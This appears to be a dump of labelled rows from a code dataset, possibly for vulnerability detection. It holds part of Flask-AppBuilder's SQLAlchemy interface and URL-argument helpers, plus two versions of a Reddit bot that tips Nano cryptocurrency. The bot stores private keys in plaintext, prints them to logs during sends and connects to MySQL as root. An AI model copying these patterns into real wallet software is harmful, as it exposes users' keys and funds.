    """"""

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """"""
    ------------- 
     GET METHODS
    -------------
    """"""

    def get_columns_list(self):
        """"""
            Returns all model's columns on SQLA properties
        """"""
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """"""
            Returns all model's columns except pk or fk
        """"""
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """"""
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """"""
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


""""""
    For Retro-Compatibility
""""""
SQLModel = SQLAInterface
/n/n/n/flask_appbuilder/urltools.py/n/nimport re
from flask import request


class Stack(object):
    """"""
        Stack data structure will not insert
        equal sequential data
    """"""
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data

def get_group_by_args():
    """"""
        Get page arguments for group by
    """"""
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by

def get_page_args():
    """"""
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """"""
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages

def get_page_size_args():
    """"""
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """"""
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes

def get_order_args():
    """"""
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """"""
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))
    return orders

def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))
/n/n/n",1
74,74,d551cbcf99305f241d3e6f9a8c724789f8ec81b6,"nano_tipper_z.py/n/nimport praw
import time
from datetime import datetime
from time import sleep
from rpc_bindings import send, open_account, generate_account, generate_qr, nano_to_raw, receive_all, send_all, \
    check_balance, validate_address, open_or_receive
import mysql.connector
import pprint

comment_footer = """"""\n***\n
[About Nano](https://nano.org) | [Where to use Nano](https://usenano.org/) | 
[Nano Tipper Z](https://github.com/danhitchcock/nano_tipper_z) | [Community Nano Projects](https://nanocenter.org) | Transaction Fee: 0.00 Nano\n
*Nano Tipper Z V0.1. This program is in early beta testing, please use with caution. Funds are not safe.*
""""""

help_text = """"""
Nano Tipper Z Bot v0.1. Use at your own risk, and don't put in more Nano than you're willing to lose.\n\n
To perform a command, create a new message with any of the following commands in the message body.\n\n
'create' - Create a new account if one does not exist\n\n
'private_key' -  (disabled) Retrieve your account private key\n\n
'new_address' - (disabled) If you feel this address was compromised, create a new account and key\n\n
'send <amount> <user/address> - Send Nano to a reddit user or an address\n\n
'receive' - Receive all pending transactions\n\n
'balance' - Retrieve your account balance. Includes both pocketed and unpocketed transactions.\n\n
'minimum <amount>' - Sets a minimum amount for receiving tips. Program minimum is 0.001 Nano.\n\n
'help' - Get this help message\n\n\n
If you have any questions or bug fixes, please contact /u/zily88.
"""""" + """"""\n"""""" + comment_footer
reddit = praw.Reddit('bot1')
#submission = reddit.submission(id='39zje0')
#print(submission.title) # to make it non-lazy
#print(submission.created)
#print(datetime.utcfromtimestamp(submission.created_utc).strftime('%Y-%m-%d %H:%M:%S'))
#pprint.pprint(vars(submission))

subreddit = reddit.subreddit(""nano_tipper_z+cryptocurrency247"")

tip_froms = []
tip_parents = []
tip_tos = []
tip_comments = []
tip_amounts = []
last_action = time.time()
program_minimum = 0.001
recipient_minimum = 0.01

with open('sql_password.txt') as f:
    sql_password = f.read()

mydb = mysql.connector.connect(user='root', password=sql_password,
                              host='localhost',
                              auth_plugin='mysql_native_password', database='nano_tipper_z')
mycursor = mydb.cursor()

#generator for our comments. Maybe this wasn't necessary, but I never get to use generators
def stream_comments_messages():
    previous_comments = {comment for comment in subreddit.comments()}
    previous_messages = {message for message in reddit.inbox.unread()}
    print('received first stream')
    while True:
        sleep(6)
        global last_action
        last_action = time.time()

        updated_comments = {comment for comment in subreddit.comments()}
        new_comments = updated_comments - previous_comments
        previous_comments = updated_comments

        # check for new messages
        updated_messages = {message for message in reddit.inbox.unread()}
        new_messages = updated_messages - previous_messages
        previous_messages = updated_messages

        # send anything new to our main program
        # also, check the message type. this will prevent posts from being seen as messages
        if len(new_comments) >= 1:
            for new_comment in new_comments:
                # if new_comment starts with 't1_'
                print('full name: ', new_comment.name)
                if new_comment.name[:3] == 't1_':
                    yield ('comment', new_comment)
        if len(new_messages) >= 1:
            for new_message in new_messages:
                # if message starts with 't4_'
                print('full name: ', new_message.name)
                if new_message.name[:3] == 't4_':
                    yield ('message', new_message)

        else:
            yield None


def update_history():
    return None


def add_history_record(username=None, action=None, sql_time=None, address=None, comment_or_message=None,
                       recipient_username=None, recipient_address=None, amount=None, hash=None, comment_id=None,
                       notes=None, reddit_time=None, comment_text=None):
    if sql_time is None:
        sql_time = time.strftime('%Y-%m-%d %H:%M:%S')

    sql = ""INSERT INTO history (username, action, sql_time, address, comment_or_message, recipient_username, "" \
          ""recipient_address, amount, hash, comment_id, notes, reddit_time, comment_text) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)""

    val = (username, action, sql_time, address, comment_or_message, recipient_username, recipient_address, amount,
           hash, comment_id, notes, reddit_time, comment_text)

    mycursor.execute(sql, val)
    mydb.commit()
    return mycursor.lastrowid


def check_registered_by_address(address):
    address = address.split('_')[1]

    sql = ""SELECT username FROM accounts WHERE address='%s'""
    val = ('xrb_' + address, )
    mycursor.execute(sql, val)
    result = mycursor.fetchall()
    if len(result) > 0:
        return result[0][0]

    sql = ""SELECT username FROM accounts WHERE address='%s'""
    val = ('nano_' + address, )
    mycursor.execute(sql, val)
    result = mycursor.fetchall()
    if len(result) > 0:
        return result[0][0]

    return None

#updated
def add_new_account(username):
    address = generate_account()
    private = address['private']
    address = address['account']
    print(type(private), type(address), type(username))
    print(private, address, username)
    sql = ""INSERT INTO accounts (username, private_key, address, minimum) VALUES (%s, %s, %s, %s)""
    val = (username, private, address, nano_to_raw(0.01))
    mycursor.execute(sql, val)
    mydb.commit()
    return address


def handle_create(message):
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    add_history_record(
        username=str(message.author),
        comment_or_message='message',
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
        action='create',
        comment_text=str(message.body)[:255]
    )

    username = str(message.author)
    sql = ""SELECT address FROM accounts WHERE username=%s""
    val = (username, )
    mycursor.execute(sql, val)
    result = mycursor.fetchall()
    if len(result) is 0:
        address = add_new_account(username)
        response = ""Hi! I have created a new account for you. Your Nano address is %s. Once Nano is sent to your new account,"" \
                   "" your balance will be"" \
                   "" unpocketed until you respond and have 'receive' in the message body.\n\nhttps://www.nanode.co/account/%s"" % (address, address)
    else:
        response = ""It looks like you already have an account made. Your Nano address is %s. Once Nano is sent to your account, your balance will be"" \
                 "" unpocketed until you respond and have 'receive' in the message body.\n\nhttps://www.nanode.co/account/%s"" % (result[0][0], result[0][0])
    x = reddit.redditor(username).message('Nano Tipper Z: Account Creation', response + comment_footer)
    # message.reply(response)


# currently deactivated
def handle_private_key(message):
    author = str(message.author)
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    add_history_record(
        username=str(message.author),
        comment_or_message='message',
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
        action='private_key',
        comment_text=str(message.body)[:255]
    )
    sql = ""SELECT address, private_key FROM accounts WHERE name='%s'""
    val = (author, )
    mycursor.execute(sql, val)
    result = mycursor.fetchall()
    if len(result) > 0:
        response = 'Your account: %s\n\nYour private key: %s'%(result[0][0],result[0][1])
        x = reddit.redditor(username).message('New Private Key', response)
        return None
    else:
        x = reddit.redditor(username).message(""No account found."",""You do not currently have an account open.""
                                                                ""To create one, respond with the text 'create' in the message body."")
        return None


#updated
def handle_balance(message):
    username = str(message.author)
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    add_history_record(
        username=str(message.author),
        comment_or_message='message',
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
        action='balance',
        comment_text=str(message.body)[:255]
    )
    sql = ""SELECT address FROM accounts WHERE username=%s""
    val = (username, )
    mycursor.execute(sql, val)
    result = mycursor.fetchall()
    if len(result)>0:
        results = check_balance(result[0][0])

        response = ""At address %s, you currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new "" \
                   ""message containing the word 'receive'\n\nhttps://www.nanode.co/account/%s"" % (result[0][0], results[0]/10**30, results[1]/10**30, result[0][0])
        reddit.redditor(username).message('Nano Tipper Z account balance', response + comment_footer)
        return None

    reddit.redditor(username).message('Nano Tipper Z: No account registered.', 'You do not have an open account yet' + comment_footer)

# currently deactivated
def handle_new_address(message):
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    add_history_record(
        username=str(message.author),
        comment_or_message='message',
        action='new_address',
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
        comment_text=str(message.body)[:255]
    )
    message.reply('not activated yet.')


#updated
def handle_send(message):
    parsed_text = str(message.body).lower().replace('\\', '').split('\n')[0].split(' ')
    response = handle_send_nano(message, parsed_text, 'message')
    message.reply(response + comment_footer)


#updated
def handle_send_nano(message, parsed_text, comment_or_message):
    user_or_address = '' # either 'user' or 'address', depending on how the recipient was specified
    private_key = ''
    adrress = ''
    recipient = ''
    recipient_username = ''
    recipient_address = ''
    message_time = datetime.utcfromtimestamp(message.created_utc) # time the reddit message was created
    username = str(message.author) # the sender

    entry_id = add_history_record(
        username=username,
        action='send',
        comment_or_message=comment_or_message,
        comment_id=message.id,
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
        comment_text=str(message.body)[:255]
        )

    # check if the message body was parsed into 2 or 3 words. If it wasn't, update the history db
    # with a failure and return the message. If the length is 2 (meaning recipient is parent author) we will
    # check that after tip amounts to limit API requests
    if len(parsed_text) >= 3:
        amount = parsed_text[1]
        recipient = parsed_text[2]
    elif len(parsed_text) == 2:
        # parse the user info in a later block of code to minimize API requests
        pass
    else:
        sql = ""UPDATE history SET notes = %s WHERE id = %s""
        val = ('could not find tip amount', entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        return 'Could not read your tip or send command, or find an amount. Be sure the amount and recipient are separated by a space.'


    # check that the tip amount is a number, and if it is high enough
    # we will also check if the tip amount is above the user minimum after we get user information
    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):
        sql = ""UPDATE history SET notes = %s WHERE id = %s""
        val = ('could not parse amount', entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        return ""Could not read your tip or send amount. Is '%s' a number?"" % parsed_text[1]

    try:
        amount = float(parsed_text[1])
    except:
        sql = ""UPDATE history SET notes = %s WHERE id = %s""
        val = ('could not parse amount', entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        return ""Could not read your tip or send amount. Is '%s' a number?"" % parsed_text[1]

    if amount < program_minimum:
        sql = ""UPDATE history SET notes = %s WHERE id = %s""
        val = ('amount below program limit', entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        return 'You must send amounts of Nano above the program limit of %s.' % program_minimum

    # check if author has an account, and if they have enough funds
    sql = ""SELECT address, private_key FROM accounts WHERE username=%s""
    val = (username, )
    mycursor.execute(sql, val)
    result = mycursor.fetchall()
    if len(result) < 1:
        sql = ""UPDATE history SET notes = %s WHERE id = %s""
        val = ('sender does not have an account', entry_id)
        mycursor.execute(sql, val)
        mydb.commit()

        return 'You do not have a tip bot account yet. To create one, send me a PM containing the'\
               "" text 'create' in the message body, or get a tip from a fellow redditor!.""
    else:
        address = result[0][0]
        private_key = result[0][1]
        results = check_balance(result[0][0])
        if nano_to_raw(amount) > results[0]:
            sql = ""UPDATE history SET notes = %s WHERE id = %s""
            val = ('insufficient funds', entry_id)
            mycursor.execute(sql, val)
            mydb.commit()
            return 'You have insufficient funds. Your account has %s pocketed (+%s unpocketed) and you are '\
                          'trying to send %s. If you have unpocketed funds, create a new message containing the text'\
                          ' ""receive"" to pocket your incoming money.'%(results[0]/10**30, results[1]/10**30, amount)

    # if there was only the command and the amount, we need to find the recipient.
    # if it was a comment, the recipient is the parent author
    # if it was a message, the program will respond with an error
    if len(parsed_text) == 2:
        if comment_or_message == 'comment':
            recipient = str(message.parent().author)
        else:
            sql = ""UPDATE history SET notes = %s, WHERE id = %s""
            val = (""no recipient specified"", entry_id)
            mycursor.execute(sql, val)
            mydb.commit()
            return ""You must specify an amount and a user.""

    # remove the /u/ if a redditor was specified
    if recipient[:3].lower() == '/u/':
        recipient = recipient[3:]
        print(recipient)

    # recipient -- first check if it is a valid address. Otherwise, check if it's a redditor
    if (recipient[:5].lower() == ""nano_"") or (recipient[:4].lower() == ""xrb_""):
        # check valid address
        success = validate_address(recipient)
        if success['valid'] == '1':
            user_or_address = 'address'
        # if not, check if it is a redditor disguised as an address (e.g. nano_is_awesome, xrb_for_life)
        else:
            try:
                print(getattr(reddit.redditor(recipient), 'is_suspended', False))
                user_or_address = 'user'
            except:
                # not a valid address or a redditor
                sql = ""UPDATE history SET notes = %s WHERE id = %s""
                val = ('invalid address or address-like redditor does not exist', entry_id)
                mycursor.execute(sql, val)
                mydb.commit()
                return '%s is neither a valid address or redditor' % recipient
    else:
        try:
            print(getattr(reddit.redditor(recipient), 'is_suspended', False))
            user_or_address = 'user'
        except:
            sql = ""UPDATE history SET notes = %s WHERE id = %s""
            val = ('redditor does not exist', entry_id)
            mycursor.execute(sql, val)
            mydb.commit()
            return ""Could not find redditor %s. Make sure you aren't writing or copy/pasting markdown."" % recipient

    # at this point:
    # 'amount' is a valid positive number and above the program minimum
    # 'username' has a valid account and enough Nano for the tip
    # 'user_or_address' is either 'user' or 'address',
    # 'recipient' is either a valid redditor or a valid Nano address

    user_minimum = -1
    # if a user is specified, reassign that as the username
    if user_or_address == 'user':
        #try to get the username information
        recipient_username = recipient
        sql = ""SELECT minimum, address FROM accounts WHERE username = %s""
        val = (recipient_username,)
        mycursor.execute(sql, val)
        myresult = mycursor.fetchall()
        # if there is a result, pull out the minimum (in raw) and nano address for the recipient
        if len(myresult) > 0:
            print(myresult[0])
            user_minimum = int(myresult[0][0])
            recipient_address = myresult[0][1]
    else:
        # if the recipient is an address, check if they have an account
        recipient_address = recipient
        recipient_username = check_registered_by_address(recipient_address)
        if recipient_username:
            sql = ""SELECT minimum, address FROM accounts WHERE username = %s""
            val = (recipient_username,)
            mycursor.execute(sql, val)
            myresult = mycursor.fetchall()
            print(myresult[0])
            user_minimum = float(myresult[0][0])

    # if either we had an account or address which has been registered, recipient_address and recipient_username will
    # have values instead of being ''. We will check the minimum
    if (user_minimum >= 0) and recipient_address and recipient_username:
        if nano_to_raw(amount) < user_minimum:
            sql = ""UPDATE history SET notes = %s WHERE id = %s""
            val = (""below user minimum"", entry_id)
            mycursor.execute(sql, val)
            mydb.commit()

            return ""Sorry, the user has set a tip minimum of %s. Your tip of %s is below this amount.""%(user_minimum/10**30, amount)

        if user_or_address == 'user':
            notes = ""sent to registered redditor""
        else:
            notes = ""sent to registered address""

        receiving_new_balance = check_balance(recipient_address)
        sql = ""UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s""
        val = (notes, address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        print(""Sending Nano: "", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)
        sent = send(address, private_key, nano_to_raw(amount), recipient_address)
        print(""Hash: "", sent)
        sql = ""UPDATE history SET hash = %s WHERE id = %s""
        val = (sent['hash'], entry_id)
        mycursor.execute(sql, val)
        mydb.commit()

        x = reddit.redditor(recipient_username).message('You just received a new Nano tip!',
                                                    'You have been tipped %s Nano at your address of %s. Your new account balance will be '
                                                    '%s received and %s unpocketed.' % (
                                                    amount, recipient_address, receiving_new_balance[0] / 10 ** 30,
                                                    (receiving_new_balance[1] / 10 ** 30 + amount)) + comment_footer)

        if user_or_address == 'user':
            return ""Sent ```%s Nano``` to %s.\nhttps://www.nanode.co/block/%s"" % (amount, recipient_username, sent['hash'])
        else:
            return ""Sent ```%s Nano``` to %s.\nhttps://www.nanode.co/block/%s"" % (amount, recipient_address, sent['hash'])

    elif recipient_address:
        # or if we have an address but no account, just send
        sql = ""UPDATE history SET notes = %s, address = %s, username = %s, recipient_address = %s, amount = %s WHERE id = %s""
        val = (
            'sent to unregistered address', address, username, recipient_address, str(nano_to_raw(amount)), entry_id)
        mycursor.execute(sql, val)
        mydb.commit()

        print(""Sending Unregistered Address: "", address, private_key, nano_to_raw(amount), recipient_address)

        sent = send(address, private_key, nano_to_raw(amount), recipient_address)
        print(""Hash: "", sent)
        sql = ""UPDATE history SET hash = %s WHERE id = %s""
        val = (sent['hash'], entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        return ""Sent ```%s Nano``` to address %s.\nhttps://www.nanode.co/block/%s"" % (amount, recipient_address, sent['hash'])

    else:
        # create a new account for redditor
        recipient_address = add_new_account(recipient_username)


        x = reddit. \
            redditor(recipient_username). \
            message('Congrats on receiving your first Nano Tip!',
                    'Welcome to Nano Tip Bot! You have just received a Nano tip in the amount of %s at your address '
                    'of %s. Here is some boilerplate.\n\n' % (
                    amount, recipient_address) + help_text + comment_footer)

        sql = ""UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s""
        val = (
        ""new user created"", address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)
        mycursor.execute(sql, val)
        mydb.commit()

        sent = send(address, private_key, nano_to_raw(amount), recipient_address)
        print(""Hash: "", sent)

        sql = ""UPDATE history SET hash = %s WHERE id = %s""
        val = (sent['hash'], entry_id)
        mycursor.execute(sql, val)
        mydb.commit()
        print(""Sending New Account Address: "", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)
        return ""Creating a new account for %s and ""\
                      ""sending ```%s Nano```.\nhttps://www.nanode.co/block/%s"" % (recipient_username, amount, sent['hash'])


def handle_receive(message):
    message_time = datetime.utcfromtimestamp(message.created_utc)
    username = str(message.author)
    # find any accounts associated with the redditor
    sql = ""SELECT address, private_key FROM accounts WHERE username=%s""
    val = (username, )
    mycursor.execute(sql, val)
    result = mycursor.fetchall()
    if len(result) > 0:
        address = result[0][0]
        open_or_receive(address, result[0][1])
        balance = check_balance(address)
        add_history_record(
            username=username,
            action='receive',
            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
            address=address,
            comment_or_message='message'
        )
        response = ""At address %s, you currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new "" \
                   ""message containing the word 'receive'\n\nhttps://www.nanode.co/account/%s"" % (
                   address, balance[0] / 10 ** 30, balance[1] / 10 ** 30, address)
        message.reply(response + comment_footer)
    else:
        add_history_record(
            username=username,
            action='receive',
            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
            comment_or_message='message'
        )
        response = ""You do not currently have an account open. To create one, respond with the text 'create' in the message body.""
        message.reply(response + comment_footer)

# updated
def handle_minimum(message):
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    # user may select a minimum tip amount to avoid spamming. Tipbot minimum is 0.001
    username = str(message.author)
    # find any accounts associated with the redditor
    parsed_text = message.body.replace('\\', '').split('\n')[0].split(' ')

    # there should be at least 2 words, a minimum and an amount.
    if len(parsed_text) < 2:
        response = ""I couldn't parse your command. I was expecting 'minimum <amount>'. Be sure to check your spacing.""
        message.reply(response)
        return None
    # check that the minimum is a number

    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):
        response = ""'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.""
        message.reply(response)
    try:
        amount = float(parsed_text[1])
    except:
        response = ""'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.""
        message.reply(response)

    # check that it's greater than 0.01
    if nano_to_raw(amount) < nano_to_raw(0.01):
        response = ""The overall tip minimum is 0.01 Nano.""
        message.reply(response)

    # check if the user is in the database
    sql = ""SELECT address FROM accounts WHERE username=%s""
    val = (username, )
    mycursor.execute(sql, val)
    result = mycursor.fetchall()
    print(result)
    if len(result) > 0:
        #open_or_receive(result[0][0], result[0][1])
        #balance = check_balance(result[0][0])
        add_history_record(
            username=username,
            action='minimum',
            amount=nano_to_raw(amount),
            address=result[0][0],
            comment_or_message='message',
            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
            comment_text=str(message.body)[:255]
        )
        sql = ""UPDATE accounts SET minimum = %s WHERE username = %s""
        print(amount)
        print(nano_to_raw(amount))
        val = (str(nano_to_raw(amount)), username)
        print(val)
        mycursor.execute(sql, val)
        mydb.commit()
        response = ""Updating tip minimum to %s""%amount
        message.reply(response)
    else:
        add_history_record(
            username=username,
            action='minimum',
            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),
            amount=nano_to_raw(amount),
            comment_text=str(message.body)[:255]
        )
        response = ""You do not currently have an account open. To create one, respond with the text 'create' in the message body.""
        message.reply(response)


# updated
def handle_help(message):
    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created
    add_history_record(
        username=str(message.author),
        action='help',
        comment_or_message='message',
        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S')
        )
    response = help_text
    message.reply(response)


# updated
def handle_comment(message):
    # remove an annoying extra space that might be in the front
    if message.body[0] == ' ':
        parsed_text = str(message.body[1:]).lower().replace('\\', '').split('\n')[0].split(' ')
    else:
        parsed_text = str(message.body).lower().replace('\\', '').split('\n')[0].split(' ')
    print(parsed_text)
    print(len(parsed_text))
    response = handle_send_nano(message, parsed_text, 'comment')
    message.reply(response + comment_footer)


def handle_message(message):
    message_body = str(message.body).lower()
    print(""Body: **"", message_body, ""**"")
    if message.body[0] == ' ':
        parsed_text = str(message.body[1:]).lower().replace('\\', '').split('\n')[0].split(' ')
    else:
        parsed_text = str(message.body).lower().replace('\\', '').split('\n')[0].split(' ')
    print(""Parsed Text:"", parsed_text)

    if parsed_text[0].lower() == 'help':
        print(""Helping"")
        handle_help(message)

    elif parsed_text[0].lower() == 'minimum':
        print(""Setting Minimum"")
        handle_minimum(message)

    elif parsed_text[0].lower() == 'create':
        print(""Creating"")
        handle_create(message)

    elif parsed_text[0].lower() == 'private_key':
        print(""private_keying"")
        # handle_private_key(message)

    elif parsed_text[0].lower() == 'new_address':
        print(""new address"")
        # handle_new_address(message)

    elif parsed_text[0].lower() == 'send':
        print(""send via PM"")
        handle_send(message)

    elif parsed_text[0].lower() == 'receive':
        print(""receive"")
        handle_receive(message)

    elif parsed_text[0].lower() == 'balance':
        print(""balance"")
        handle_balance(message)
    else:
        add_history_record(
            username=str(message.author),
            comment_text=str(message.body)[:255],
            comment_or_message='message',
        )


# main loop
for action_item in stream_comments_messages():
    if action_item is None:
        pass
        #print('No news.')
    elif action_item[0] == 'comment':
        print(time.strftime('%Y-%m-%d %H:%M:%S'))
        print('Comment: ', action_item[1].author, action_item[1].body[:20])
        if action_item[1].body[0]==' ':
            parsed_text = str(action_item[1].body[1:]).lower().replace('\\', '').split('\n')[0].split(' ')
        else:
            parsed_text = str(action_item[1].body).lower().replace('\\', '').split('\n')[0].split(' ')
        print('Parsed comment: ', parsed_text)
        if parsed_text[0] == r'!nano_tip':
            print('\n')
            print('*****************************************************')
            print('found an item.')
            handle_comment(action_item[1])

    elif action_item[0] == 'message':
        if action_item[1].author == 'nano_tipper_z':
            pass
        else:
            print(time.strftime('%Y-%m-%d %H:%M:%S'))
            print('A new message was found %s, sent by %s.'%(action_item[1], action_item[1].author ))
            handle_message(action_item[1])



/n/n/n",0
75,75,d551cbcf99305f241d3e6f9a8c724789f8ec81b6,"/nano_tipper_z.py/n/nimport praw
import time
from datetime import datetime
from time import sleep
from rpc_bindings import send, open_account, generate_account, generate_qr, nano_to_raw, receive_all, send_all, \
    check_balance, validate_address, open_or_receive
import mysql.connector
import pprint

comment_footer = """"""
\n\n*Nano Tipper Z Bot v0.1. Replies to this comment might be treated as PM commands. This program is in beta testing,
 and your funds could be lost.*
""""""

help_text = """"""
Nano Tipper Z Bot v0.1. Use at your own risk, and don't put in more Nano than you're willing to lose.\n\n
To perform a command, create a new message with any of the following commands in the message body.\n\n
'create' - Create a new account if one does not exist\n\n
'private_key' -  (disabled) Retrieve your account private key\n\n
'new_address' - (disabled) If you feel this address was compromised, create a new account and key\n\n
'send <amount> <user/address> - Send Nano to a reddit user or an address\n\n
'receive' - Receive all pending transactions\n\n
'balance' - Retrieve your account balance. Includes both pocketed and unpocketed transactions.\n\n
'minimum <amount>' - Sets a minimum amount for receiving tips. Program minimum is 0.001 Nano.\n\n
'help' - Get this help message\n\n\n
If you have any questions or bug fixes, please contact /u/zily88.
""""""
reddit = praw.Reddit('bot1')
#submission = reddit.submission(id='39zje0')
#print(submission.title) # to make it non-lazy
#print(submission.created)
#print(datetime.utcfromtimestamp(submission.created_utc).strftime('%Y-%m-%d %H:%M:%S'))
#pprint.pprint(vars(submission))

subreddit = reddit.subreddit(""nano_tipper_z+cryptocurrency247"")

tip_froms = []
tip_parents = []
tip_tos = []
tip_comments = []
tip_amounts = []
last_action = time.time()
program_minimum = 0.001
recipient_minimum = 0.01

with open('sql_password.txt') as f:
    sql_password = f.read()

mydb = mysql.connector.connect(user='root', password=sql_password,
                              host='localhost',
                              auth_plugin='mysql_native_password', database='nano_tipper_z')
mycursor = mydb.cursor()

#generator for our comments. Maybe this wasn't necessary, but I never get to use generators
def stream_comments_messages():
    previous_comments = {comment for comment in subreddit.comments()}
    previous_messages = {message for message in reddit.inbox.unread()}
    print('received first stream')
    while True:
        sleep(6)
        global last_action
        last_action = time.time()

        updated_comments = {comment for comment in subreddit.comments()}
        new_comments = updated_comments - previous_comments
        previous_comments = updated_comments

        # check for new messages
        updated_messages = {message for message in reddit.inbox.unread()}
        new_messages = updated_messages - previous_messages
        previous_messages = updated_messages

        # send anything new to our main program
        # also, check the message type. this will prevent posts from being seen as messages
        if len(new_comments) >= 1:
            for new_comment in new_comments:
                # if new_comment starts with 't1_'
                print('full name: ', new_comment.name)
                if new_comment.name[:3] == 't1_':
                    yield ('comment', new_comment)
        if len(new_messages) >= 1:
            for new_message in new_messages:
                # if message starts with 't4_'
                print('full name: ', new_message.name)
